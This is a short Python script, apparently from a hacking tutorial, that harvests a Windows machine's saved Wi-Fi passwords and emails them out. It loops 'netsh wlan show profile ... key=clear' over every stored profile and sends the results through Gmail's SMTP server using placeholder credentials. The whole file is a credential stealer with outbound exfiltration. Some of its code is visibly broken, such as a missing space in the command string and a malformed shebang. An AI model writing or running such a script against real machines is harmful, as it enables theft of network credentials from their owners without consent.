#!usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in networks_names_list:
    command = "netsh wlan show profile" + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("your_email@mail.com", "your_password", result)
